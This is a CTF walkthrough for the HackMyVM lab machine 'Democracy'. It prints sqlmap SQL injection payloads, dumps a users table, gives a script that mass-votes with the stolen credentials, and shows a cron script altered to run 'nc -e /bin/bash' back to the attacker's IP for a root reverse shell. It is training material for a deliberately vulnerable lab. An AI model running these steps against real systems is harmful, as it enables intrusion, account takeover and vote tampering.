---
title: CTF Walkthrough for HackMyVM Machine Democracy
category: [Walkthrough, CTF]
tags: [hackmyvm, writeup, democracy, machines, sqli]   
image:
  path: /assets/img/posts/walthrough/hackmyvm/2024-09-18-democracy/box-democracy.png
---

## Introduction
Greetings everyone, in this walkthrough, we will talk about Democracy a machine among HackMyVM machines. This walkthrough is not only meant to catch the flag but also to demonstrate how a penetration tester will approach this machine in a real-world assessment.
This machine was set up using VirtualBox as recommended by the creator and the Network configuration was changed to 'Nat Network'.
### Machine Description
Name: Democracy<br>
Goal: Get two flags<br>
OS: Linux<br>
Download link: [Democracy](https://downloads.hackmyvm.eu/democracy.zip)<br>
### Tools used
1) Nmap<br>
2) Zaproxy<br>
3) Python3<br>
4) SQLMap

## Reconnaissance
This machine displays its IP address on startup so, no need to perform any form of host discovery on our network. With the target's IP, we will perform a service scan to enumerate services running on open ports.
```bash
┌──(pentester㉿kali)-[~/Democracy/Scans/Service]
└─$nmap -n 10.0.2.19 -sV -sC -oN service-scan.nmap
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-16 21:28 BST
Nmap scan report for 10.0.2.19
Host is up (0.00073s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 db:f9:46:e5:20:81:6c:ee:c7:25:08:ab:22:51:36:6c (RSA)
|   256 33:c0:95:64:29:47:23:dd:86:4e:e6:b8:07:33:67:ad (ECDSA)
|_  256 be:aa:6d:42:43:dd:7d:d4:0e:0d:74:78:c1:89:a1:36 (ED25519)
80/tcp open  http    Apache httpd 2.4.56 ((Debian))
|_http-server-header: Apache/2.4.56 (Debian)
|_http-title: Vote for Your Candidate
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.52 seconds
```

The target runs an SSH and an Nginx web server. When we visit this page we see that this server seems to manage a country's election. One party believes in the preservation and secrecy of digital data while the other supports the idea of free and open sharing of digital data and FTP servers.
![](/assets/img/posts/walthrough/hackmyvm/2024-09-18-democracy/1-browse.png)

We can see the vote button under each candidate. When we click on this button we are directed to /vote.php. Since we are not logged in, we are redirected back to the login page.
![](/assets/img/posts/walthrough/hackmyvm/2024-09-18-democracy/login-from.png)

At this point of the assessment we do not have an account on the web application, let's click on *Don't have an account yet* to create a user account.
![](registration-form.png)

After creating an account we successfully log into the web application which offers options to vote, to view the vote results, or to reset votes. 
![](/assets/img/posts/walthrough/hackmyvm/2024-09-18-democracy/vote-page.png)

To understand how the web application functions, let's click on each option and see the request.
![](/assets/img/posts/walthrough/hackmyvm/2024-09-18-democracy/vote-success.png)
![](/assets/img/posts/walthrough/hackmyvm/2024-09-18-democracy/vote-error.png)
![](/assets/img/posts/walthrough/hackmyvm/2024-09-18-democracy/vote-result.png)
![](/assets/img/posts/walthrough/hackmyvm/2024-09-18-democracy/vote-reset.png)

In the images above we see that we cannot vote twice. To vote a second time,  we first have to reset our previous vote.
When we click on view results the votes of the candidate we voted for appear this proves that this information is stored in a database and hence we can start testing for SQLi vulnerability in the web application. 
We have three parameters we can test i.e. candidate, reset, and view_results. If we look closer the value of the parameter candidate has more chances to be used in the SQL query compared to the value of reset and view_resets which may just be used in a conditional statement in the PHP script of this page.  
To test for SQLi vulnerability we can add special characters used in SQL queries to create a malformed query that will generate an error.
![](/assets/img/posts/walthrough/hackmyvm/2024-09-18-democracy/sqli-notification.png)

We see that our malformed query indeed returned an error message we can now automate this process using SQLMap. Remember that the parameter candidate is been processed by the query only when we have empty votes. If we used SQLMap to automate the injection process, we would also have to automatically reset the votes. We can do this using the bash command below.
```bash
┌──(pentester㉿kali)-[~/DemocracyScans/Web]
└─$while true; do curl -s http://10.0.2.19/vote.php -X POST -H 'Content-Type: application/x-www-form-urlencoded' -H 'Cookie: PHPSESSID=90jt0r5s8i3s1o2u5iufi2h6rj; voted=1'; done
```

In a second shell, we can start SQLMap. Since we know our target is a Linux machine that runs an Nginx web server and uses PHP as the backend scripting language we can deduce that  it uses the LEMP (Linux, Nginx Server, MySQL Database, PHP) web application stack. With this information, we can save time and precise the target DBMS on the target to SQLMap with the **--dbms** option.
```bash
┌──(pentester㉿kali)-[~/Democracy/Scans/Web]
└─$sqlmap http://10.0.2.19/vote.php -X POST -H 'Cookie: PHPSESSID=90jt0r5s8i3s1o2u5iufi2h6rj; voted=1' --data 'candidate=democrat' --dbms=MySQL 
<SNIP>

[*] starting @ 10:55:40 /2024-09-17/
[04:24:50] [INFO] testing connection to the target URL 
[04:24:50] [INFO] testing if the target URL content is stable                    
you provided a HTTP Cookie header value, while target URL provides its own cookies within HTTP Set-Cookie header which intersect with yours. Do you want to merge them in further requests? [Y/n] y                
[04:24:53] [INFO] target URL content is stable           
[04:24:53] [INFO] testing if POST parameter 'candidate' is dynamic            
<SNIP>                    
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y                                                                             
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] y                                                              
<SNIP>                               
[04:25:17] [INFO] POST parameter 'candidate' is 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)' injectable                                        
<SNIP>                                       
[04:25:27] [INFO] POST parameter 'candidate' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable                                                                                                                  
<SNIP>  
POST parameter 'candidate' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n                                                      
sqlmap identified the following injection point(s) with a total of 1520 HTTP(s) requests:                                                                    
---                                                                           
Parameter: candidate (POST)                                                   
    Type: error-based                                                         
    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)                                                    
    Payload: candidate=democ' AND EXTRACTVALUE(3363,CONCAT(0x5c,0x716b787171,(SELECT (ELT(3363=3363,1))),0x716b7a6b71)) AND 'oRKZ'='oRKZ

    Type: time-based blind                                                    
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)                    
    Payload: candidate=democ' AND (SELECT 2463 FROM (SELECT(SLEEP(5)))rJHC) AND 'zDHR'='zDHR                                                                 
---                                                                           
[10:56:53] [INFO] the back-end DBMS is MySQL
[10:56:53] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] y
web server operating system: Linux Debian
web application technology: Apache 2.4.56
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[10:57:05] [INFO] fetched data logged to text files under '/home/pentester/.local/share/sqlmap/output/10.0.2.19'

[*] ending @ 10:57:05 /2024-09-17/
```

## Exploitation

Now that we know that the candidate parameter is vulnerable to time-based and error-based SQLi, let's leverage this vulnerability to enumerate the database content. Let's start by enumerating all the databases on the server. 
```bash
┌──(pentester㉿kali)-[~/Democracy/Scans/Web]
└─$sqlmap http://10.0.2.19/vote.php -X POST -H 'Cookie: PHPSESSID=90jt0r5s8i3s1o2u5iufi2h6rj; voted=1' --data 'candidate=democrat' --dbs --tables

<SNIP>
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: candidate (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: candidate=democrat' AND (SELECT 9519 FROM (SELECT(SLEEP(10)))iNpV) AND 'UeeB'='UeeB
---
[11:33:10] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: Apache 2.4.56
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[11:33:10] [INFO] fetching database names
[11:33:10] [INFO] fetching number of databases
[11:33:10] [INFO] resumed: 1
[11:33:10] [INFO] resumed: information_schema
available databases [1]:
[*] information_schema

[11:33:10] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[11:33:10] [INFO] fetching current database
you provided a HTTP Cookie header value, while target URL provides its own cookies within HTTP Set-Cookie header which intersect with yours. Do you want to merge them in further requests? [Y/n] y
.............................. (done)
[11:33:30] [CRITICAL] considerable lagging has been detected in connection response(s). Please use as high value for option '--time-sec' as possible (e.g. 10 or more)
[11:33:31] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
[11:34:44] [ERROR] invalid character detected. retrying..
voting
[11:38:47] [INFO] fetching tables for database: 'voting'
[11:38:47] [INFO] fetching number of tables for database 'voting'
[11:38:47] [INFO] retrieved: 2
[11:39:12] [INFO] retrieved: users
[11:42:01] [INFO] retrieved: votes
<SNIP>
[*] ending @ 12:24:55 /2024-09-17/
```

At this point,  we have successfully retrieved the databases and the tables present on the target MySQL instance. We can see in our result that a non-default database named voting, this database appears to contain an interesting table named users. 

```bash
┌──(pentester㉿kali)-[~/Democracy/Scans/Web]                         
└─$sqlmap http://10.0.2.19/vote.php -X POST -H 'Cookie: PHPSESSID=90jt0r5s8i3s1o2u5iufi2h6rj; voted=1' --data 'candidate=democ' --delay=0.5 -D voting  -T users --columns        
<SNIP>
[*] starting @ 12:27:21 /2024-09-17/                                             
[12:27:22] [INFO] resuming back-end DBMS 'mysql'                                 
[12:27:22] [INFO] testing connection to the target URL                   
sqlmap resumed the following injection point(s) from stored session:             
<SNIP>

back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)  
web server operating system: Linux Debian                                       
web application technology: Apache 2.4.56                                   
back-end DBMS: MySQL >= 5.1 (MariaDB fork)                                
[04:25:37] [INFO] fetching columns for table 'users' in database 'voting'  
[04:25:37] [INFO] retrieved: 'id'               
[04:25:37] [INFO] retrieved: 'int(11)'                    
[04:25:37] [INFO] retrieved: 'username'                       
[04:25:37] [INFO] retrieved: 'varchar(255)'                                
[04:25:37] [INFO] retrieved: 'password'                                
[04:25:37] [INFO] retrieved: 'varchar(255)'                                  
[04:25:37] [INFO] fetching entries for table 'users' in database 'voting'
[04:25:37] [INFO] retrieved: '1'                                 
[04:25:37] [INFO] retrieved: 'azerty'                                   
[04:25:37] [INFO] retrieved: 'paolo'                                       
[04:25:37] [INFO] retrieved: '2'                                        
[04:25:37] [INFO] retrieved: 'sturgeon'  
[04:25:37] [INFO] retrieved: 'rank'                                            
[04:25:37] [INFO] retrieved: '3'       
<SNIP>
[04:26:20] [INFO] retrieved: '1021'                                          
[04:26:20] [INFO] retrieved: 'test1'                                   
[04:26:20] [INFO] retrieved: 'admin..(),),'")'                                   
[04:26:20] [INFO] retrieved: '1022'                                      
[04:26:20] [INFO] retrieved: 'test1'                                         
[04:26:20] [INFO] retrieved: 'admin'jSfDni<'">StWONv'
Database: voting                                                             
Table: users                                                              
[1005 entries]                                                           
+------+---------------+------------------------+                        
| id   | password      | username               |
+------+---------------+------------------------+
<SNIP>
[04:26:20] [WARNING] console output will be trimmed to last 256 rows due to large table size
<SNIP>                                                           
| 1020 | test1         | 2916                   |
| 1021 | test1         | admin..(),),'")        |
| 1022 | test1         | admin'jSfDni<'">StWONv |
+------+---------------+------------------------+

[04:26:20] [INFO] table 'voting.users' dumped to CSV file '/home/pentester/.local/share/sqlmap/output/10.0.2.19/dump/voting/users.csv'
[04:26:20] [INFO] fetched data logged to text files under '/home/pentester/.local/share/sqlmap/output/10.0.2.19'

[*] ending @ 04:26:20 /2024-09-18/
```

Now that we have the username and passwords of the electors, we can influence the vote and select one party. Remember that on the home page of this web application, it was mentioned that the first candidate to reach 1000 votes will win the elections. We currently own the accounts of 1022 electors so, let's choose a party and vote for them.  Logging into every account manually will be time-consuming. For this reason, we will write a script to automate the process. We will first create a username and a password list.
```bash
┌──(pentester㉿kali)-[~/Democracy/Misc Files]
└─$head -n 1001 /home/pentester/.local/share/sqlmap/output/10.0.2.19/dump/voting/users.csv | cut -d "," -f2,3  > user-pass.txt
```
Also, it was mentioned by the Democratic party that they support the idea of free and open sharing of digital data and FTP servers. Let's vote for this party and see if they will keep their promise. The Python code below automatically logs into each account present in the **user-pass.txt** file created above and votes for Democrat.

```python
#!/usr/bin/python3.11
import requests

proxy = {'http': 'http://127.0.0.1:8080'}
with open("user-pass.txt", "r") as file:
    numb_votes = 0
    for credentials in  file:
        user_creds = credentials.split(",")
        user_session = requests.session()
        r = user_session.post("http://10.0.2.19/login.php", data={"username": user_creds[1].strip("\n"), "password": user_creds[0]}, proxies=proxy)
        r = user_session.post("http://10.0.2.19/vote.php", data={"candidate": "democrat"}, proxies=proxy)

        if "Thank you for voting" in r.text:
            numb_votes += 1
    
    print(f"[+] The candidate democrat has {numb_votes} votes")
```
After the script completes, we can click on view votes and we will be redirected to the systemopening.php page. From the name of this page, we can deduce that the democratic party kept its promises and exposed the FTP server to the public.
![](/assets/img/posts/walthrough/hackmyvm/2024-09-18-democracy/after-1000-vote.png)

## Post Exploitation
Let's perform a new service scan on the target to identify the port where the FTP server is running.

```bash
┌──(pentester㉿kali)-[~/Democracy/Scans/Service]
└─$nmap -sC -sV 10.0.2.19 -oN service-scan-2.nmap
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-18 11:05 BST
Nmap scan report for 10.0.2.19
Host is up (0.00045s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rwxrwxrwx   1 root     root          258 Apr 30  2023 votes [NSE: writeable]
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
<SNIP>
80/tcp open  http    Apache httpd 2.4.56 ((Debian))
<SNIP>

Nmap done: 1 IP address (1 host up) scanned in 14.35 seconds
```

The FTP server has indeed been opened and we can see that an anonymous login is enabled on this server. Let's log into the server and enumerate the information that has been made public.
```bash
┌──(pentester㉿kali)-[~/Democracy/Scans/Service]
└─$ftp 10.0.2.19 
Connected to 10.0.2.19.
220 ProFTPD Server (Debian) [::ffff:10.0.2.19]
Name (10.0.2.19:pentester): anonymous
331 Anonymous login ok, send your complete email address as your password
Password: 
230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
229 Entering Extended Passive Mode (|||44407|)
150 Opening ASCII mode data connection for file list
drwxr-xr-x   2 ftp      nogroup      4096 Apr 30  2023 .
drwxr-xr-x   2 ftp      nogroup      4096 Apr 30  2023 ..
-rwxrwxrwx   1 root     root          258 Apr 30  2023 votes
226 Transfer complete
ftp> more votes
#! /bin/bash
## this script runs every minute ##
#!/bin/bash
mysql -u root -pYklX69Vfa voting << EOF
SELECT COUNT(*) FROM votes WHERE candidate='republican';
SELECT COUNT(*) FROM votes WHERE candidate='democrat';
EOF
nc -e /bin/bash 192.168.0.29 4444
ftp> 
```

The FTP server hosts a script executed after every minute. The most interesting thing is that this script is writable by any user and appears to make a reverse connection to a local IP address. Let's download the script, modify the IP address for the reverse connection, and upload it back to the FTP server.
```bash
ftp> ascii
200 Type set to A
ftp> get votes
local: votes remote: votes
229 Entering Extended Passive Mode (|||63887|)
150 Opening ASCII mode data connection for votes (258 bytes)
   273        4.26 MiB/s 
226 Transfer complete
273 bytes received in 00:00 (261.11 KiB/s)
ftp> exit

┌──(pentester㉿kali)-[~/Democracy/Misc Files]
└─$sed -i 's/192.168.0.29/10.0.2.16/' votes

┌──(pentester㉿kali)-[~/Democracy/Scans/Service]
└─$ftp 10.0.2.19 
Connected to 10.0.2.19.
<SNIP>
ftp> ascii
200 Type set to A
ftp> put votes
local: votes remote: votes
229 Entering Extended Passive Mode (|||59982|)
150 Opening ASCII mode data connection for votes
100% |****************************************************************************************************************|   270        2.57 MiB/s    --:-- ETA
226 Transfer complete
270 bytes sent in 00:00 (240.13 KiB/s)
```

Now that we have uploaded the modified script, let's start a reverse connection and see if the script is indeed executed after one minute.
```bash
┌──(pentester㉿kali)-[~/Democracy/Misc Files]
└─$nc -lvnp 4444          
listening on [any] 4444 ...
connect to [10.0.2.16] from (UNKNOWN) [10.0.2.19] 35252
```

We can see that we obtained a reverse connection from the target. Now let's upgrade this shell to a tty shell.
```bash
┌──(pentester㉿kali)-[~/Democracy/Misc Files]
└─$nc -lvnp 4444          
listening on [any] 4444 ...
connect to [10.0.2.16] from (UNKNOWN) [10.0.2.19] 35252
whereis python3
python3: /usr/bin/python3.9-config /usr/bin/python3 ...SNIP...

python3 -c 'import pty; pty.spawn("/bin/bash")' 
root@democracy:~# ^Z
zsh: suspended  nc -lvnp 4444

┌──(pentester㉿kali)-[~/Democracy/Misc Files]
└─$stty raw -echo;fg
[1]  + continued  nc -lvnp 4444
                               export TERM=xterm
root@democracy:~# 
```

After obtaining the tty shell we can see that we are logged in as root. We can confirm this by using the **whoami** command on the system as seen below. We can now use this access to read both the user and the root flag.

```bash
root@democracy:~# whoami
root
root@democracy:~# ls
root.txt
root@democracy:~# ls /home/trump/
user.txt
root@democracy:~# 
```

## Conclusion
Congratulations! In this walkthrough, you have exploited an SQL injection vulnerability in a web application that did not properly sanitise input data. This machine illustrates the critical risks of failing to properly sanitise user input before incorporating it into SQL queries. It also highlights the dangers of hosting sensitive information, such as automation scripts, with open permissions on FTP servers with anonymous login enabled. By understanding these vulnerabilities, we can better protect our systems from potential threats. Thank you for following up on this walkthrough.
